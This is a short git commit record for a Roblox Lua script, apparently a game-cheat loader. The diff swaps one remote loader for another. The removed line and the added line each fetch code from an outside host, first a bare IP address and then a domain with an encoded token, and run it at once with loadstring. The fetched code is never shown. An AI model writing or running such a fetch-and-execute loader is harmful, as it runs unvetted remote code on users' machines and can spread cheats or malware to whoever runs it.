6e8964a9869d156acbd271c13eade45868d7686c
ShowGUARDhub <regardstest938@gmail.com>
2026-06-23 02:01:09 +0300

    roblox.lua

--- roblox.lua
+++ roblox.lua
@@ -1,2 +1,1 @@
-ID="c27eca66-ed0c-49a0-b166-21bbe33a01f6";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImEyNTZjNTFhLWE5ZDItNDRjMi1hYzBmLWRjNmIyMWQ4NzU5YiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmUifX0"))()
